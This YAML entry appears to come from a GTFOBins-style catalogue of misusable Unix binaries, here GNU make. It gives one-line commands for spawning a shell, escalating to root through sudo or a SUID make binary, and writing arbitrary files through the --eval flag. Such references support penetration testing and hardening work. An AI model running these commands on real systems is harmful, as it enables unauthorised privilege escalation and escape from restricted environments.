---
description: |
  All these examples only work with GNU `make` due to the lack of support of the
  `--eval` flag. The same can be achieved by using a proper `Makefile` of by
  passing the content via stdin, that is:

  ```
  make -s --eval=<commands>
  ```

  becomes:

  ```
  make -s -f <(echo <commands>)
  ```
functions:
  execute-interactive:
    - code: |
        COMMAND='/bin/sh'
        make -s --eval=$'x:\n\t-'"$COMMAND"
  sudo-enabled:
    - code: |
        COMMAND='/bin/sh'
        sudo make -s --eval=$'x:\n\t-'"$COMMAND"
  suid-enabled:
    - code: |
        COMMAND='/bin/sh -p'
        ./make -s --eval=$'x:\n\t-'"$COMMAND"
  file-write:
    - code: |
        LFILE=file_to_write
        make -s --eval="\$(file >$LFILE,data)" .
---
